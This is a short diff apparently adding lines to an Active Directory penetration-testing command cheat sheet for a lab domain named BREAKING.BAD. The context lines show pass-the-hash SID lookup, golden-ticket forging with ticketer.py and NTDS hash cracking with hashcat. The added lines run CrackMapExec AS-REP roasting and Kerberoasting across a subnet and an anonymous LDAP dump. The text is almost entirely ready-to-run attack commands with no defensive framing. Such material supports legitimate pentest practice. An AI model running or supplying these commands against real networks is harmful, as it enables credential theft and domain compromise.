@@ -141,3 +141,8 @@ lookupsid.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 'BREAKING.BAD/Administrat
 ticketer.py -nthash 123456789krbtgtnthash123456789 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD randomuser
 export KRB5CCNAME=randomuser.ccache
 hashcat -m 1000 --potfile-path ntds.cracked ntds.tocrack --show --username --outfile-format 3
+cme ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt
+cme ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
+crackmapexec ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt
+crackmapexec ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
+ldapsearch -x -h 192.168.56.101 -D '' -w '' -b "dc=BREAKING,dc=BAD"
